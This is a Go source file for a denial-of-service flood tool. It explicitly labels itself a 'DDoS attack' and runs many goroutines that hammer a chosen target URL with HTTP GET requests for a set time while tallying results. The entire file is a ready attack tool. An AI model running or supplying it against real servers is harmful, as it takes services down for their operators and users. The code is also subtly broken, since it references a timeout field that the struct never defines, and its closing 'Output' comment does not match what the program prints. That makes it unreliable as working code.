package main

import (
    "encoding/json"
    "flag"
    "fmt"
    "github.com/valyala/fasthttp"
    "io/ioutil"
    "log"
    "net/url"
    "runtime"
    "sync/atomic"
    "time"
)

// DDoS - structure of value for DDoS attack
type DDoS struct {
    url           string
    headers       map[string]string
    stop          *chan bool
    amountWorkers int

    // Statistic
    successRequest int64
    amountRequests int64
}

// New - initialization of new DDoS attack
func New(URL string, workers int, Headers map[string]string) (*DDoS, error) {
    if workers < 1 {
        return nil, fmt.Errorf("Amount of workers cannot be less 1")
    }
    u, err := url.Parse(URL)
    if err != nil || len(u.Host) == 0 {
        return nil, fmt.Errorf("Undefined host or error = %v", err)
    }

    s := make(chan bool)
    return &DDoS{
        url:           URL,
        headers:       Headers,
        stop:          &s,
        amountWorkers: workers,
    }, nil
}

// Run - run DDoS attack
func (d *DDoS) Run() {
    for i := 0; i < d.amountWorkers; i++ {
        go func() {
            for {
                select {
                case <-(*d.stop):
                    return
                default:
                    // sent http GET requests

                    req := fasthttp.AcquireRequest()
                    req.SetRequestURI(d.url)
                    for k, v := range d.headers {
                        req.Header.Add(k, v)
                    }
                    client := &fasthttp.Client{}
                    err := client.DoTimeout(req, nil, d.timeout)
                    atomic.AddInt64(&d.amountRequests, 1)
                    if err == nil {
                        atomic.AddInt64(&d.successRequest, 1)
                    } else {
                        log.Println(err)
                    }
                }
                runtime.Gosched()
            }
        }()
    }
}

// Stop - stop DDoS attack
func (d *DDoS) Stop() {
    for i := 0; i < d.amountWorkers; i++ {
        (*d.stop) <- true
    }
    close(*d.stop)
}

// Result - result of DDoS attack
func (d DDoS) Result() (successRequest, amountRequests int64) {
    return d.successRequest, d.amountRequests
}

func main() {

    workers := flag.Int("w", 100, "worker num")
    targetUrl := flag.String("u", "http://127.0.0.1:80", "target url")
    workTime := flag.Int("t", 1, "how many  seconds attack keep")
    jsonConfig := flag.String("hc", "", "headers json congfig file path")
    flag.Parse()

    log.Println("start ~~~")
    log.Printf("worker | %d\n", *workers)
    log.Printf("target | %s", *targetUrl)
    log.Printf("keep   | %d Seconds\n", *workTime)

    headers := make(map[string]string)

    if len(*jsonConfig) > 0 {
        file, err := ioutil.ReadFile(*jsonConfig)
        if err != nil {
            log.Printf("File error: %v\n", err)
            panic(err)
        }
        json.Unmarshal(file, &headers)
        for k, v := range headers {
            log.Print(k, v)
        }
    }
    
    d, err := New(*targetUrl, *workers, headers)
    if err != nil {
        panic(err)
    }
    d.Run()
    time.Sleep(time.Duration(*workTime) * time.Second)
    d.Stop()
    fmt.Println(d.Result())
    fmt.Println("DDoS attack finish")
    // Output: DDoS attack server: http://127.0.0.1:80
}
